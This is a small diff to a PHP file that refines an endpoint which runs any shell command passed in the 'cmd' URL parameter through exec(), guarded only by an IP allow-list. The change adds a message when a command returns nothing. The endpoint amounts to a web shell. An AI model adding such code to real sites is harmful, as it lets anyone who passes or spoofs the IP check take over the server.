@@ -6,6 +6,9 @@ if(!in_array(get_client_ip(),$white_list)){
 }
 if(isset($_GET["cmd"])){
   exec($_GET["cmd"],$r);
+  if($r===[]){
+    $r = ["command '{$_GET["cmd"]}' executed with no return value"];
+  }
   echo json_encode($r);
   exit;
 }
